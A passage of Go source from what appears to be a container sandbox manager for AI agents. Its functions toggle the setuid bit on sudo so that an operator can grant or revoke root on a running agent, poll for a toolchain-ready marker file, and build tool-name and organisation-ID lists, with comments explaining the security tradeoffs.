// as root inside the container. That is a live change to a real mechanism: with
// the bit cleared sudo cannot escalate at all, and the agent — which runs
// unprivileged — cannot put it back, because doing so needs the very privilege
// it is being denied.
//
// This exists because the alternative was worse. Sudo used to be decided by the
// container's no-new-privileges option, which the kernel applies at creation
// and cannot be changed afterwards; changing your mind meant recreating the
// container, and these sandboxes have no volume, so recreating one throws away
// everything the agent has done. Being unable to revoke sudo without destroying
// the workspace is a bad place to be during an incident.
//
// The trade is stated plainly: containers are no longer created with
// no-new-privileges, so the setuid bit is what stands between the agent and
// root rather than a kernel-level refusal on top of it. In exchange the grant
// can be withdrawn in seconds, on a running agent, without losing its work.
func (m *Manager) SetSudo(ctx context.Context, inst *protocol.Instance, allowed bool) error {
	if inst.Runtime == "" {
		return fmt.Errorf("instance has no container")
	}
	mode := "u-s"
	if allowed {
		mode = "u+s"
	}
	out, err := m.docker.ExecAs(ctx, inst.Runtime, "0",
		[]string{"chmod", mode, "/usr/bin/sudo"})
	if err != nil {
		return fmt.Errorf("could not change sudo: %w", err)
	}
	if trimmed := strings.TrimSpace(out); trimmed != "" {
		// chmod is silent on success; anything it printed is a problem.
		return fmt.Errorf("could not change sudo: %s", trimmed)
	}
	return nil
}

// waitForTools waits for the sandbox to finish installing its toolchain.
//
// Polled rather than pushed because the alternative is agentd growing an
// endpoint whose only purpose is to say "not yet", and the sandbox already
// writes a marker for anyone wondering whether the workspace is still filling
// in. Giving up quietly is the right failure: the verification that follows
// simply sees fewer tools, and under-claiming is safe.
func (m *Manager) waitForTools(ctx context.Context, inst *protocol.Instance, budget time.Duration) {
	deadline := time.Now().Add(budget)
	for time.Now().Before(deadline) {
		out, err := m.docker.ExecAs(ctx, inst.Runtime, "0",
			[]string{"bash", "-lc", "test -f /home/agent/work/.tools-ready && echo ready"})
		if err == nil && strings.Contains(out, "ready") {
			return
		}
		select {
		case <-ctx.Done():
			return
		case <-time.After(3 * time.Second):
		}
	}
}

func customToolNames(tools []protocol.CustomTool) []string {
	out := make([]string, 0, len(tools))
	for _, t := range tools {
		out = append(out, t.Name)
	}
	return out
}

// orgIDsFor turns the single department a bot is created into into the list it
// is stored as. Creating into none is legitimate: an unassigned bot is visible
// only to a global admin until it is filed.
func orgIDsFor(orgID string) []string {
	if strings.TrimSpace(orgID) == "" {
		return nil
	}
	return []string{orgID}
}
